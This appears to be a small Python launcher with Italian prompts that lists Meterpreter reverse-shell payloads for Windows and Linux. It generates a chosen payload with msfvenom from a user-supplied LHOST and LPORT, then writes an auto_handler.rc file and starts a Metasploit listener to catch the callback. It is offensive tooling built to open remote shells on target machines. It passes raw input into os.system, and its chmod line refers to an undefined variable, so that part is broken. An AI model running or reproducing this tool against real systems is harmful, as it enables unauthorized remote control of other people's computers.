import os
import pyfiglet

def print_ascii():
    ascii_art = pyfiglet.figlet_format("====LISTS   PAYLOADS====")
    print(ascii_art)

def print_ascii2():
    ascii_art = pyfiglet.figlet_format("INTERFACES")
    print(ascii_art)

def print_ascii3():
    ascii_art = pyfiglet.figlet_format("MSFVENOM    GENERATE")
    print(ascii_art)


print_ascii()
print(f"windows/x64/meterpreter/reverse_tcp")
print(f"windows/x64/meterpreter/reverse_http")
print(f"windows/x64/meterpreter/reverse_https")
print(f"windows/meterpreter/reverse_tcp")
print(f"windows/meterpreter/reverse_http")
print(f"windows/meterpreter/reverse_https")
print(f"linux/x86/meterpreter/reverse_tcp")
print(f"linux/x86/meterpreter_reverse_http")
print(f"linux/x86/meterpreter_reverse_https")
print(f"linux/x86/meterpreter_reverse_tcp")
print(f"linux/x64/meterpreter_reverse_tcp")
print(f"linux/x64/meterpreter_reverse_http")
print(f"linux/x64/meterpreter_reverse_https")
print(f".........................................")
print_ascii3()
payload = input("Inserisci il payload = ")
LHOST = input("LHOST = ")
LPORT = input("LPORT = ")
formato = input("Formato(ES. exe, elf, python, apk, raw) = ")
nome = input("Inserisci un output = ")

os.system(f"msfvenom -p {payload} LHOST={LHOST} LPORT={LPORT} -f {formato} > {nome}")
print("[*] Generazione payload in corso.....")
rc_content = f"""
use exploit/multi/handler
set payload {payload}
set LHOST {LHOST}
set LPORT {LPORT}
exploit
"""
os.system(f"chmod 777 {nome}.{este}")

with open("auto_handler.rc", "w") as f:f.write(rc_content)

print("[*] Avvio di metasploit in corso....")
os.system("msfconsole -r auto_handler.rc")



